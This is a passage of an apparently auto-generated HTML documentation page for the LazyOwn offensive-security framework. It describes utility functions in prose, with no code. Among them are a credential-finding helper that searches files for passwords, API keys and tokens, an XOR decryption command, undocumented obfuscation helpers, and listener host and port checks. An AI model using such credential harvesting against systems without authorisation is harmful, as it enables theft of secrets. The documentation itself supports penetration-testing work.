prints an error message and returns.</li>
<li>Reads the encrypted file specified by <code>file_path</code>.</li>
<li>Decrypts the file contents using the
<code>xor_encrypt_decrypt</code> function with the provided
<code>key</code>.</li>
<li>Writes the decrypted data to a new file by removing the “.enc”
extension from the original file name.</li>
<li>Prints a message indicating the file has been decrypted.</li>
<li>Catches and handles the <code>FileNotFoundError</code> exception if
the specified file does not exist, and prints an error message.</li>
</ol>
<p>:param line: A string containing the file path and the key separated
by a space. :type line: str :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: decrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
with the path to the encrypted file and <code>&lt;key&gt;</code> with
the decryption key.</p>
<h2 id="get_output">get_output</h2>
<p>Devuelve la salida acumulada</p>
<h2 id="double_base64_encode">double_base64_encode</h2>
<p>No description available.</p>
<h2 id="apply_obfuscations">apply_obfuscations</h2>
<p>No description available.</p>
</body>
</html>
<!-- END COMMANDS -->

<!-- contenido anterior -->

<!-- START UTILS -->
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>LazyOwn Framework Doc: UTILS.md</title>
  <style>
    html {
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 12px;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      html {
        background-color: white;
      }
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    svg {
      height: auto;
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
      font-size: 85%;
      margin: 0;
      hyphens: manual;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
</head>
<body>
<header id="title-block-header">
<h1 class="title">LazyOwn Framework Doc: UTILS.md</h1>
</header>
<h1 id="utils.md-documentation-by-readmeneitor.py">UTILS.md
Documentation by readmeneitor.py</h1>
<h2 id="print_error">print_error</h2>
<p>Prints an error message to the console.</p>
<p>This function takes an error message as input and prints it to the
console with a specific format to indicate that it is an error.</p>
<p>:param error: The error message to be printed. :type error: str
:return: None</p>
<h2 id="print_msg">print_msg</h2>
<p>Prints a message to the console.</p>
<p>This function takes a message as input and prints it to the console
with a specific format to indicate that it is an informational
message.</p>
<p>:param msg: The message to be printed. :type msg: str :return:
None</p>
<h2 id="print_warn">print_warn</h2>
<p>Prints a warning message to the console.</p>
<p>This function takes a warning message as input and prints it to the
console with a specific format to indicate that it is a warning.</p>
<p>:param warn: The warning message to be printed. :type warn: str
:return: None</p>
<h2 id="signal_handler">signal_handler</h2>
<p>Handles signals such as Control + C and shows a message on how to
exit.</p>
<p>This function is used to handle signals like Control + C (SIGINT) and
prints a warning message instructing the user on how to exit the program
using the commands ‘exit’, ‘q’, or ‘qa’.</p>
<p>:param sig: The signal number. :type sig: int :param frame: The
current stack frame. :type frame: frame :return: None</p>
<h2 id="check_rhost">check_rhost</h2>
<p>Checks if the remote host (rhost) is defined and shows an error
message if it is not.</p>
<p>This function verifies if the <code>rhost</code> parameter is set. If
it is not defined, an error message is printed, providing an example and
directing the user to additional help.</p>
<p>:param rhost: The remote host to be checked. :type rhost: str
:return: True if rhost is defined, False otherwise. :rtype: bool</p>
<h2 id="check_lhost">check_lhost</h2>
<p>Checks if the local host (lhost) is defined and shows an error
message if it is not.</p>
<p>This function verifies if the <code>lhost</code> parameter is set. If
it is not defined, an error message is printed, providing an example and
directing the user to additional help.</p>
<p>:param lhost: The local host to be checked. :type lhost: str :return:
True if lhost is defined, False otherwise. :rtype: bool</p>
<h2 id="check_lport">check_lport</h2>
<p>Checks if the local port (lport) is defined and shows an error
message if it is not.</p>
<p>This function verifies if the <code>lport</code> parameter is set. If
it is not defined, an error message is printed, providing an example and
directing the user to additional help.</p>
<p>:param lport: The local port to be checked. :type lport: int or str
:return: True if lport is defined, False otherwise. :rtype: bool</p>
<h2 id="is_binary_present">is_binary_present</h2>
<p>Internal function to verify if a binary is present on the operating
system.</p>
<p>This function checks if a specified binary is available in the
system’s PATH by using the <code>which</code> command. It returns True
if the binary is found and False otherwise.</p>
<p>:param binary_name: The name of the binary to be checked. :type
binary_name: str :return: True if the binary is present, False
otherwise. :rtype: bool</p>
<h2 id="handle_multiple_rhosts">handle_multiple_rhosts</h2>
<p>Internal function to handle multiple remote hosts (rhost) for
operations.</p>
<p>This function is a decorator that allows an operation to be performed
across multiple remote hosts specified in
<code>self.params["rhost"]</code>. It converts a single remote host into
a list if necessary, and then iterates over each host, performing the
given function with each host. After the operation, it restores the
original remote host value.</p>
<p>:param func: The function to be decorated and executed for each
remote host. :type func: function :return: The decorated function.
:rtype: function</p>
<h2 id="check_sudo">check_sudo</h2>
<p>Checks if the script is running with superuser (sudo) privileges, and
if not, restarts the script with sudo privileges.</p>
<p>This function verifies if the script is being executed with root
privileges by checking the effective user ID. If the script is not
running as root, it prints a warning message and restarts the script
using sudo.</p>
<p>:return: None</p>
<h2 id="activate_virtualenv">activate_virtualenv</h2>
<p>Activates a virtual environment and starts an interactive shell.</p>
<p>This function activates a virtual environment located at
<code>venv_path</code> and then launches an interactive bash shell with
the virtual environment activated.</p>
<p>:param venv_path: The path to the virtual environment directory.
:type venv_path: str :return: None</p>
<h2 id="parse_proc_net_file">parse_proc_net_file</h2>
<p>Internal function to parse a /proc/net file and extract network
ports.</p>
<p>This function reads a file specified by <code>file_path</code>,
processes each line to extract local addresses and ports, and converts
them from hexadecimal to decimal. The IP addresses are converted from
hexadecimal format to standard dot-decimal notation. The function
returns a list of tuples, each containing an IP address and a port
number.</p>
<p>:param file_path: The path to the /proc/net file to be parsed. :type
file_path: str :return: A list of tuples, each containing an IP address
and a port number. :rtype: list of tuple</p>
<h2 id="get_open_ports">get_open_ports</h2>
<p>Internal function to get open TCP and UDP ports on the operating
system.</p>
<p>This function uses the <code>parse_proc_net_file</code> function to
extract open TCP and UDP ports from the corresponding /proc/net files.
It returns two lists: one for TCP ports and one for UDP ports.</p>
<p>:return: A tuple containing two lists: the first list with open TCP
ports and the second list with open UDP ports. :rtype: tuple of (list of
tuple, list of tuple)</p>
<h2 id="find_credentials">find_credentials</h2>
<p>Searches for potential credentials in files within the specified
directory.</p>
<p>This function uses a regular expression to find possible credentials
such as passwords, secrets, API keys, and tokens in files within the
given directory. It iterates through all files in the directory and
prints any matches found.</p>
<p>:param directory: The directory to search for files containing
credentials. :type directory: str :return: None</p>
<h2 id="rotate_char">rotate_char</h2>
<p>Internal function to rotate characters for ROT cipher.</p>
<p>This function takes a character and a shift value, and rotates the
character by the specified shift amount. It only affects alphabetical
characters, leaving non-alphabetical characters unchanged.</p>
<p>:param c: The character to be rotated. :type c: str :param shift: The
number of positions to shift the character. :type shift: int :return:
The rotated character. :rtype: str</p>
<h2 id="get_network_info">get_network_info</h2>
<p>Retrieves network interface information with their associated IP
addresses.</p>
<p>This function executes a shell command to gather network interface
details, parses the output to extract interface names and their
corresponding IP addresses, and returns this information in a dictionary
format. The dictionary keys are interface names, and the values are IP
addresses.</p>
<p>:return: A dictionary where the keys are network interface names and
the values are their associated IP addresses. :rtype: dict</p>
<h2 id="getprompt">getprompt</h2>
<p>Generate a command prompt string with network information and user
status.</p>
<p>:param: None</p>
<p>:returns: A string representing the command prompt with network
information and user status.</p>
<p>Manual execution: To manually get a prompt string with network
information and user status, ensure you have
<code>get_network_info()</code> implemented to return a dictionary of
network interfaces and their IPs. Then use the function to create a
prompt string based on the current user and network info.</p>
<p>Example: If the function <code>get_network_info()</code> returns: {
‘tun0’: ‘10.0.0.1’, ‘eth0’: ‘192.168.1.2’ }</p>
<p>And the user is root, the prompt string generated might be:
[LazyOwn👽10.0.0.1]# If the user is not root, it would be:
[LazyOwn👽10.0.0.1]$</p>
<p>If no ‘tun’ interface is found, the function will use the first
available IP or fallback to ‘127.0.0.1’.</p>
<h2 id="copy2clip">copy2clip</h2>
<p>Copia el texto proporcionado al portapapeles usando xclip.</p>
<p>Args: text (str): El texto que se desea copiar al portapapeles.</p>
<p>Example: copy2clip(“Hello, World!”)</p>
<h2 id="wrapper">wrapper</h2>
<p>internal wrapper of internal function to implement multiples rhost to
operate.</p>
</body>
</html>
<!-- END UTILS -->

<!-- contenido posterior -->
         </div>
        <div class="footer">
            <p>&copy; 2024 LazyOwn Framework. All rights GPLv3.</p>
        </div>
    </div>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-T4VF6JJ095"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-T4VF6JJ095');
</script>    
<script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
<script>
  kofiWidgetOverlay.draw('grisuno', {
    'type': 'floating-chat',
    'floating-chat.donateButton.text': 'Support me',
    'floating-chat.donateButton.background-color': '#5cb85c',
    'floating-chat.donateButton.text-color': '#fff'
  });
</script>    
<style>
    html {
    background-color: #000; /* Fondo negro */
    color: #00ff00; /* Color del texto verde neón */
    font-family: 'VT323', monospace; /* Fuente monospace */
    margin: 0;
    padding: 0;
    height: 95vh; /* Altura del 95% de la ventana del navegador */
    overflow: auto; /* Permite el desplazamiento si es necesario */
}
.container {
    width: 100%;
    margin: 0 auto;
    padding: 20px;
    background-color: #111; /* Fondo del contenedor */
    border-radius: 10px;
    box-shadow: 0 0 10px #00ff00;
}    
</style>
</body>
</html>
